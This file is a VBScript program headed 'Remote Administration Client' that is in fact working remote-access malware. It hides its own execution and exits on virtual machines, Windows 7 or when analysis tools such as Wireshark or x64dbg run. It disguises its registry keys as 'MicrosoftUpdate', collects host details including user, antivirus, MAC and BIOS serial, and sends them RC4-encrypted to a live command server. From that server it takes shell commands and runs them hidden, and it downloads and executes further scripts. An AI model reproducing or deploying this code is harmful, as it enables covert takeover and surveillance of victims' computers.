' Remote Administration Client
Dim BASE_URL : BASE_URL = "https://arg6.sbs/2/agent26/api.php"
Dim SECRET   : SECRET   = "remoterm-secret-change-me"

Dim sh : Set sh = CreateObject("WScript.Shell")

If InStr(LCase(WScript.FullName), "wscript") > 0 Then
    sh.Run "cmd /c start /b cscript.exe //nologo """ & WScript.ScriptFullName & """", 0, False
    WScript.Quit
End If

On Error Resume Next
Dim wmiCheck : Set wmiCheck = GetObject("winmgmts:\\.\root\cimv2")
Dim osQuery  : Set osQuery  = wmiCheck.ExecQuery("SELECT Version FROM Win32_OperatingSystem")
Dim osItem
For Each osItem In osQuery
    Dim osVer : osVer = osItem.Version
Next
Set wmiCheck = Nothing
On Error GoTo 0
If Left(osVer, 3) = "6.1" Then WScript.Quit

On Error Resume Next
Dim wmiVM  : Set wmiVM  = GetObject("winmgmts:\\.\root\cimv2")
Dim qBIOS  : Set qBIOS  = wmiVM.ExecQuery("SELECT Manufacturer,Version FROM Win32_BIOS")
Dim qBoard : Set qBoard = wmiVM.ExecQuery("SELECT Manufacturer,Product FROM Win32_BaseBoard")
Dim biosMan : biosMan = "" : Dim biosVer : biosVer = ""
Dim boardMan : boardMan = "" : Dim boardProd : boardProd = ""
Dim bItem
For Each bItem In qBIOS  : biosMan = LCase(bItem.Manufacturer) : biosVer = LCase(bItem.Version) : Next
For Each bItem In qBoard : boardMan = LCase(bItem.Manufacturer) : boardProd = LCase(bItem.Product) : Next
Set wmiVM = Nothing
On Error GoTo 0
Dim vmStr : vmStr = biosMan & biosVer & boardMan & boardProd
If InStr(vmStr,"vmware")>0 Or InStr(vmStr,"virtualbox")>0 Or InStr(vmStr,"vbox")>0 Or _
   InStr(vmStr,"hyper-v")>0 Or InStr(vmStr,"microsoft corporation")>0 And InStr(vmStr,"virtual")>0 Or _
   InStr(vmStr,"qemu")>0 Or InStr(vmStr,"xen")>0 Or InStr(vmStr,"innotek")>0 Then WScript.Quit

Dim badProcs : badProcs = Array( _
    "procmon","procmon64","procexp","procexp64","wireshark","fiddler", _
    "ollydbg","x64dbg","x32dbg","windbg","idaq","idaq64","idaw","idaw64", _
    "pestudio","lordpe","petools","cff explorer","die","detect-it-easy", _
    "dnspy","de4dot","ilspy","reflector","dotpeek","jd-gui","jadx", _
    "tcpview","autoruns","autorunsc","regshot","systracer","noriben", _
    "sandboxie","sbiectrl","sbiesvc","vboxservice","vmwaretray","vmwareuser", _
    "vmsrvc","vmusrvc","df5serv","vboxtray","xenservice" _
)
On Error Resume Next
Dim wmiProc : Set wmiProc = GetObject("winmgmts:\\.\root\cimv2")
Dim qProc   : Set qProc   = wmiProc.ExecQuery("SELECT Name FROM Win32_Process")
Dim pItem
For Each pItem In qProc
    Dim pName : pName = LCase(pItem.Name)
    Dim bp
    For Each bp In badProcs
        If InStr(pName, bp) > 0 Then
            Set wmiProc = Nothing
            WScript.Quit
        End If
    Next
Next
Set wmiProc = Nothing
On Error GoTo 0

On Error Resume Next
Dim wmiPC : Set wmiPC = GetObject("winmgmts:\\.\root\cimv2")
Dim qPC   : Set qPC   = wmiPC.ExecQuery("SELECT Name FROM Win32_Process")
Dim procCount : procCount = 0
Dim pcItem
For Each pcItem In qPC : procCount = procCount + 1 : Next
Set wmiPC = Nothing
On Error GoTo 0
If procCount < 25 Then WScript.Quit

Dim regBase : regBase = "HKCU\Software\MicrosoftUpdate\"
Dim regHB   : regHB   = regBase & "Heartbeat"
Dim regUUID : regUUID = regBase & "ClientId"

On Error Resume Next
Dim lastBeat : lastBeat = CDbl(sh.RegRead(regHB))
Dim hbErr    : hbErr    = Err.Number
On Error GoTo 0
If hbErr = 0 Then
    Dim age : age = CDbl(Timer) - lastBeat
    If age < 0 Then age = age + 86400
    If age < 30 Then WScript.Quit
End If
sh.RegWrite regHB, CStr(CDbl(Timer)), "REG_SZ"

Dim clientId : clientId = ""
On Error Resume Next
clientId = sh.RegRead(regUUID)
On Error GoTo 0
If Len(clientId) <> 36 Then
    On Error Resume Next
    Dim typeLib : Set typeLib = CreateObject("Scriptlet.TypeLib")
    If Err.Number <> 0 Then WScript.Quit
    On Error GoTo 0
    clientId = Mid(typeLib.Guid, 2, 36)
    Set typeLib = Nothing
    sh.RegWrite regUUID, clientId, "REG_SZ"
End If

Function RC4Hex(plaintext)
    Dim keyBytes() : ReDim keyBytes(Len(SECRET) - 1)
    Dim i
    For i = 0 To Len(SECRET) - 1
        keyBytes(i) = Asc(Mid(SECRET, i + 1, 1))
    Next
    Dim S(255)
    For i = 0 To 255 : S(i) = i : Next
    Dim j : j = 0
    For i = 0 To 255
        j = (j + S(i) + keyBytes(i Mod Len(SECRET))) Mod 256
        Dim tmp1 : tmp1 = S(i) : S(i) = S(j) : S(j) = tmp1
    Next
    i = 0 : j = 0
    Dim out : out = ""
    Dim hexChars : hexChars = "0123456789abcdef"
    Dim k
    For k = 1 To Len(plaintext)
        i = (i + 1) Mod 256
        j = (j + S(i)) Mod 256
        Dim tmp2 : tmp2 = S(i) : S(i) = S(j) : S(j) = tmp2
        Dim xb : xb = S((S(i) + S(j)) Mod 256) Xor Asc(Mid(plaintext, k, 1))
        out = out & Mid(hexChars, (xb \ 16) + 1, 1) & Mid(hexChars, (xb Mod 16) + 1, 1)
    Next
    RC4Hex = out
End Function

Function RC4Unhex(hexStr)
    If Len(hexStr) = 0 Then RC4Unhex = "" : Exit Function
    Dim bytes : bytes = ""
    Dim i
    For i = 1 To Len(hexStr) Step 2
        bytes = bytes & Chr(CLng("&H" & Mid(hexStr, i, 2)))
    Next
    Dim keyBytes() : ReDim keyBytes(Len(SECRET) - 1)
    For i = 0 To Len(SECRET) - 1
        keyBytes(i) = Asc(Mid(SECRET, i + 1, 1))
    Next
    Dim S(255)
    For i = 0 To 255 : S(i) = i : Next
    Dim j : j = 0
    For i = 0 To 255
        j = (j + S(i) + keyBytes(i Mod Len(SECRET))) Mod 256
        Dim tmp1 : tmp1 = S(i) : S(i) = S(j) : S(j) = tmp1
    Next
    i = 0 : j = 0
    Dim out : out = ""
    Dim k
    For k = 1 To Len(bytes)
        i = (i + 1) Mod 256
        j = (j + S(i)) Mod 256
        Dim tmp2 : tmp2 = S(i) : S(i) = S(j) : S(j) = tmp2
        out = out & Chr(S((S(i) + S(j)) Mod 256) Xor Asc(Mid(bytes, k, 1)))
    Next
    RC4Unhex = out
End Function

Function ReadFile(path)
    ReadFile = ""
    On Error Resume Next
    Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(path) Then
        Dim f : Set f = fso.OpenTextFile(path, 1)
        If Not f.AtEndOfStream Then ReadFile = f.ReadAll()
        f.Close
        fso.DeleteFile path
    End If
    Set fso = Nothing : On Error GoTo 0
End Function

Function RunCmd2(shellCmd)
    Dim tmpF : tmpF = sh.ExpandEnvironmentStrings("%TEMP%") & "\rmt" & Right(CStr(CLng(Timer*100)), 6) & ".txt"
    sh.Run "cmd /c " & shellCmd & " > """ & tmpF & """ 2>&1", 0, True
    Dim res : res = Trim(ReadFile(tmpF))
    If res = "" Then res = "(no output)"
    RunCmd2 = res
End Function

Function DownloadAndRunVbs(url)
    Dim rnd4 : rnd4 = Right(CStr(CLng(Timer * 1000)), 4)
    Dim tmpV : tmpV = sh.ExpandEnvironmentStrings("%TEMP%") & "\svc" & rnd4 & ".vbs"

    ' — Paso 1: descargar con WinHttp
    On Error Resume Next
    Dim http2 : Set http2 = CreateObject("WinHttp.WinHttpRequest.5.1")
    http2.Open "GET", url, False
    http2.SetTimeouts 15000, 15000, 120000, 120000
    http2.SetRequestHeader "X-Client-Id", clientId
    http2.Send
    Dim dlErr : dlErr = Err.Number
    Dim dlSt  : dlSt  = 0
    If dlErr = 0 Then dlSt = http2.Status
    On Error GoTo 0

    If dlErr <> 0 Or dlSt <> 200 Then
        DownloadAndRunVbs = "[GETVBS] error descarga err=" & dlErr & " http=" & dlSt
        Set http2 = Nothing : Exit Function
    End If

    ' — Paso 2: escribir con ADODB.Stream (binario) — evita restricciones de FSO
    On Error Resume Next
    Dim stm : Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1          ' adTypeBinary
    stm.Open
    stm.Write http2.ResponseBody
    stm.SaveToFile tmpV, 2
    stm.Close
    Set stm = Nothing
    Set http2 = Nothing
    Dim stmErr : stmErr = Err.Number
    On Error GoTo 0

    If stmErr <> 0 Then
        DownloadAndRunVbs = "[GETVBS] error escritura ADODB=" & stmErr
        Exit Function
    End If

    ' Verificar que existe
    On Error Resume Next
    Dim fso2 : Set fso2 = CreateObject("Scripting.FileSystemObject")
    Dim fExists : fExists = fso2.FileExists(tmpV)
    Dim fSize : fSize = 0
    If fExists Then fSize = fso2.GetFile(tmpV).Size
    Set fso2 = Nothing
    On Error GoTo 0

    If Not fExists Or fSize < 5 Then
        DownloadAndRunVbs = "[GETVBS] archivo no creado o vacio"
        Exit Function
    End If

    ' — Paso 3: lanzar con Shell COM independiente — desvinculado del proceso padre
    On Error Resume Next
    Dim sh2 : Set sh2 = CreateObject("WScript.Shell")
    sh2.Run "cscript.exe //nologo //e:vbscript """ & tmpV & """", 0, False
    Dim runErr : runErr = Err.Number
    Set sh2 = Nothing
    On Error GoTo 0

    If runErr <> 0 Then
        DownloadAndRunVbs = "[GETVBS] error lanzar=" & runErr
        Exit Function
    End If

    DownloadAndRunVbs = "[GETVBS] OK " & fSize & " bytes"
End Function

Function GetSysInfo()
    On Error Resume Next
    Dim wmi : Set wmi = GetObject("winmgmts:\\.\root\cimv2")

    Dim h : h = ""
    Dim oNet : Set oNet = CreateObject("WScript.Network")
    h = oNet.ComputerName
    Set oNet = Nothing

    Dim o : o = ""
    Dim qOS : Set qOS = wmi.ExecQuery("SELECT Caption FROM Win32_OperatingSystem")
    Dim oOS
    For Each oOS In qOS : o = oOS.Caption : Next

    Dim a : a = ""
    Dim oEnv : Set oEnv = sh.Environment("PROCESS")
    a = oEnv("PROCESSOR_ARCHITECTURE")

    Dim u : u = ""
    u = oEnv("USERNAME")

    Dim dom : dom = ""
    dom = oEnv("USERDOMAIN")

    Dim av : av = ""
    On Error Resume Next
    Dim wmiSC : Set wmiSC = GetObject("winmgmts:\\.\root\SecurityCenter2")
    Dim qAV : Set qAV = wmiSC.ExecQuery("SELECT displayName FROM AntiVirusProduct")
    Dim oAV
    For Each oAV In qAV : av = oAV.displayName : Exit For : Next
    On Error GoTo 0

    Dim r : r = ""
    Dim qCS : Set qCS = wmi.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem")
    Dim oCS
    For Each oCS In qCS
        Dim gb : gb = CDbl(oCS.TotalPhysicalMemory) / 1073741824
        r = Left(CStr(Int(gb * 10 + 0.5) / 10), 3)
    Next

    Dim cpuName : cpuName = ""
    Dim qCPU : Set qCPU = wmi.ExecQuery("SELECT Name FROM Win32_Processor")
    Dim oCPU
    For Each oCPU In qCPU : cpuName = oCPU.Name : Exit For : Next

    ' País via GeoID de Windows (no requiere PowerShell)
    Dim cc : cc = ""
    On Error Resume Next
    Dim geoId : geoId = 0
    Dim oRegGeo
    Set oRegGeo = Nothing
    ' GeoID guardado en registro por Windows
    geoId = CInt(sh.RegRead("HKCU\Control Panel\International\Geo\Nation"))
    On Error GoTo 0
    Select Case geoId
        Case 9   : cc = "US"
        Case 11  : cc = "AR"
        Case 12  : cc = "AU"
        Case 17  : cc = "CA"
        Case 21  : cc = "CL"
        Case 22  : cc = "CO"
        Case 32  : cc = "BR"
        Case 39  : cc = "GB"
        Case 62  : cc = "ES"
        Case 75  : cc = "DE"
        Case 84  : cc = "FR"
        Case 99  : cc = "IN"
        Case 103 : cc = "IT"
        Case 137 : cc = "MX"
        Case 165 : cc = "NL"
        Case 193 : cc = "PE"
        Case 196 : cc = "PL"
        Case 203 : cc = "PT"
        Case 207 : cc = "RU"
        Case 217 : cc = "ES"
        Case 240 : cc = "TR"
        Case 244 : cc = "UA"
        Case 104 : cc = "JP"
        Case 45  : cc = "CN"
        Case 242 : cc = "TW"
        Case 236 : cc = "TH"
        Case 134 : cc = "MY"
        Case 139 : cc = "NZ"
        Case 168 : cc = "NG"
        Case 74  : cc = "EG"
        Case 109 : cc = "KR"
        Case Else : cc = ""
    End Select

    ' Uptime
    Dim upt : upt = ""
    Dim qUP : Set qUP = wmi.ExecQuery("SELECT LastBootUpTime FROM Win32_OperatingSystem")
    Dim oUP
    For Each oUP In qUP
        On Error Resume Next
        Dim bootStr : bootStr = Left(oUP.LastBootUpTime, 14)
        Dim bootY : bootY = CInt(Left(bootStr,4))
        Dim bootMo : bootMo = CInt(Mid(bootStr,5,2))
        Dim bootD : bootD = CInt(Mid(bootStr,7,2))
        Dim bootH : bootH = CInt(Mid(bootStr,9,2))
        Dim bootMi : bootMi = CInt(Mid(bootStr,11,2))
        Dim bootS : bootS = CInt(Mid(bootStr,13,2))
        Dim bootDT : bootDT = DateSerial(bootY,bootMo,bootD) + TimeSerial(bootH,bootMi,bootS)
        Dim diffSec : diffSec = DateDiff("s", bootDT, Now())
        Dim uptD : uptD = Int(diffSec / 86400)
        Dim uptH : uptH = Int((diffSec Mod 86400) / 3600)
        Dim uptM : uptM = Int((diffSec Mod 3600) / 60)
        upt = uptD & "d " & uptH & "h " & uptM & "m"
        On Error GoTo 0
    Next

    ' Disco C: libre/total
    Dim dsk : dsk = ""
    On Error Resume Next
    Dim qDisk : Set qDisk = wmi.ExecQuery("SELECT Size,FreeSpace FROM Win32_LogicalDisk WHERE DeviceID='C:'")
    Dim oDisk
    For Each oDisk In qDisk
        Dim dTotal : dTotal = Int(CDbl(oDisk.Size) / 1073741824)
        Dim dFree  : dFree  = Int(CDbl(oDisk.FreeSpace) / 1073741824)
        dsk = dFree & "GB free / " & dTotal & "GB"
    Next
    On Error GoTo 0

    ' IP local y MAC
    Dim lip : lip = "" : Dim mac : mac = ""
    On Error Resume Next
    Dim qNIC : Set qNIC = wmi.ExecQuery("SELECT IPAddress,MACAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True")
    Dim oNIC
    For Each oNIC In qNIC
        If IsArray(oNIC.IPAddress) Then
            Dim ipArr : ipArr = oNIC.IPAddress
            If UBound(ipArr) >= 0 Then
                If InStr(ipArr(0), ".") > 0 And Left(ipArr(0),3) <> "169" Then
                    lip = ipArr(0)
                    mac = oNIC.MACAddress
                    Exit For
                End If
            End If
        End If
    Next
    On Error GoTo 0

    ' Resolución de pantalla
    Dim res : res = ""
    On Error Resume Next
    Dim qVid : Set qVid = wmi.ExecQuery("SELECT CurrentHorizontalResolution,CurrentVerticalResolution FROM Win32_VideoController")
    Dim oVid
    For Each oVid In qVid
        If oVid.CurrentHorizontalResolution > 0 Then
            res = oVid.CurrentHorizontalResolution & "x" & oVid.CurrentVerticalResolution
            Exit For
        End If
    Next
    On Error GoTo 0

    ' Serial del sistema
    Dim ser : ser = ""
    On Error Resume Next
    Dim qBios : Set qBios = wmi.ExecQuery("SELECT SerialNumber FROM Win32_BIOS")
    Dim oBios
    For Each oBios In qBios : ser = Trim(oBios.SerialNumber) : Exit For : Next
    On Error GoTo 0

    ' Gateway
    Dim gw : gw = ""
    On Error Resume Next
    Dim qGW : Set qGW = wmi.ExecQuery("SELECT DefaultIPGateway FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True")
    Dim oGW
    For Each oGW In qGW
        If IsArray(oGW.DefaultIPGateway) Then
            If UBound(oGW.DefaultIPGateway) >= 0 Then
                gw = oGW.DefaultIPGateway(0)
                If gw <> "" Then Exit For
            End If
        End If
    Next
    On Error GoTo 0

    Set wmi = Nothing
    GetSysInfo = "__INFO__:" & h & "|" & o & "|" & a & "|" & u & "|" & av & "|" & r & "|" & cpuName & "|" & cc & "||" & dom & "|" & upt & "|" & dsk & "|" & lip & "|" & mac & "|" & res & "|" & ser & "|" & gw
End Function

Function SendSysInfo()
    Dim siOut : siOut = GetSysInfo()
    If siOut = "" Then SendSysInfo = "" : Exit Function
    Dim siEnc : siEnc = RC4Hex(siOut)
    If siEnc = "" Then siEnc = siOut
    HttpReq "POST", "?action=output", siEnc
    SendSysInfo = ""
End Function

Function RunCmd(rcCmd)
    Dim rcCmdL : rcCmdL = LCase(Trim(rcCmd))
    If rcCmdL = "__sysinfo__" Then
        RunCmd = SendSysInfo() : Exit Function
    End If
    If Left(rcCmd, 10) = "__GETVBS__" Then
        RunCmd = DownloadAndRunVbs(Mid(rcCmd, 11)) : Exit Function
    End If
    If rcCmdL = "__ping__" Then
        RunCmd = DoPing() : Exit Function
    End If
    RunCmd = RunCmd2(rcCmd)
End Function

Function DoPing()
    On Error Resume Next
    Dim res : res = ""

    ' Ping a 8.8.8.8
    Dim tmpF : tmpF = sh.ExpandEnvironmentStrings("%TEMP%") & "\pg" & Right(CStr(CLng(Timer*100)),5) & ".txt"
    sh.Run "cmd /c ping -n 3 8.8.8.8 > """ & tmpF & """ 2>&1", 0, True

    Dim fso3 : Set fso3 = CreateObject("Scripting.FileSystemObject")
    If fso3.FileExists(tmpF) Then
        Dim f : Set f = fso3.OpenTextFile(tmpF, 1)
        Dim raw : raw = "" : Dim ln
        Do While Not f.AtEndOfStream
            ln = f.ReadLine()
            raw = raw & ln & Chr(10)
        Loop
        f.Close
        fso3.DeleteFile tmpF

        ' Extraer latencia promedio
        Dim avg : avg = ""
        Dim i : i = 1
        Do While i <= Len(raw)
            Dim pos : pos = InStr(i, raw, "Average = ")
            If pos > 0 Then
                Dim rest : rest = Mid(raw, pos + 10)
                avg = Left(rest, InStr(rest, Chr(10)) - 1)
                avg = Trim(avg)
                Exit Do
            End If
            i = Len(raw) + 1
        Loop

        ' Contar paquetes perdidos
        Dim lostPos : lostPos = InStr(raw, "Lost = ")
        Dim lost : lost = "?"
        If lostPos > 0 Then
            Dim lostRest : lostRest = Mid(raw, lostPos + 7)
            lost = Left(lostRest, InStr(lostRest, " ") - 1)
        End If

        If avg <> "" Then
            res = "[PING] 8.8.8.8 avg=" & avg & " lost=" & lost
        ElseIf InStr(raw, "timed out") > 0 Or InStr(raw, "100%") > 0 Then
            res = "[PING] 8.8.8.8 — sin respuesta (100% perdido)"
        Else
            res = "[PING] " & Left(raw, 200)
        End If
    Else
        res = "[PING] error ejecutando ping"
    End If

    Set fso3 = Nothing
    On Error GoTo 0
    DoPing = res
End Function

Function HttpReq(method, qs, body)
    HttpReq = ""
    On Error Resume Next
    Dim http : Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open method, BASE_URL & qs, False
    http.SetTimeouts 7000, 7000, 7000, 7000
    http.SetRequestHeader "X-Client-Id", clientId
    If method = "POST" Then
        http.SetRequestHeader "Content-Type", "text/plain"
        http.Send body
    Else
        http.Send
    End If
    If Err.Number = 0 And http.Status = 200 Then HttpReq = http.ResponseText
    Set http = Nothing : On Error GoTo 0
End Function

Dim sleepMs     : sleepMs     = 500
Dim sysInfoSent : sysInfoSent = False
Dim MAX_SLEEP   : MAX_SLEEP   = 8000
Dim loopEnc     : loopEnc     = ""
Dim loopCmd     : loopCmd     = ""
Dim loopOut     : loopOut     = ""
Dim loopSilent  : loopSilent  = False
Dim loopEncOut  : loopEncOut  = ""

Do
    On Error Resume Next
    sh.RegWrite regHB, CStr(CDbl(Timer)), "REG_SZ"
    On Error GoTo 0

    loopEnc = Trim(HttpReq("GET", "?action=cmd", ""))
    If loopEnc <> "" Then
        sleepMs = 500
        loopCmd = ""
        If Left(loopEnc, 2) = "__" Then
            loopCmd = loopEnc
        Else
            loopCmd = RC4Unhex(loopEnc)
            If loopCmd = "" Then loopCmd = loopEnc
        End If
        If LCase(Trim(loopCmd)) = "exit" Then
            On Error Resume Next
            sh.RegDelete regHB
            sh.RegDelete regUUID
            On Error GoTo 0
            WScript.Quit
        End If
        loopOut    = RunCmd(loopCmd)
        loopSilent = (Left(loopCmd, 2) = "__") And (Left(loopCmd, 10) <> "__GETVBS__") And (LCase(Trim(loopCmd)) <> "__ping__")
        If loopOut <> "" And Not loopSilent Then
            loopEncOut = RC4Hex(loopOut)
            If loopEncOut = "" Then loopEncOut = loopOut
            HttpReq "POST", "?action=output", loopEncOut
        End If
        WScript.Sleep 300
    Else
        If Not sysInfoSent Then
            sysInfoSent = True
            SendSysInfo()
        End If
        WScript.Sleep sleepMs
        If sleepMs < MAX_SLEEP Then sleepMs = sleepMs + 500
    End If
Loop

On Error Resume Next
sh.RegDelete regHB
On Error GoTo 0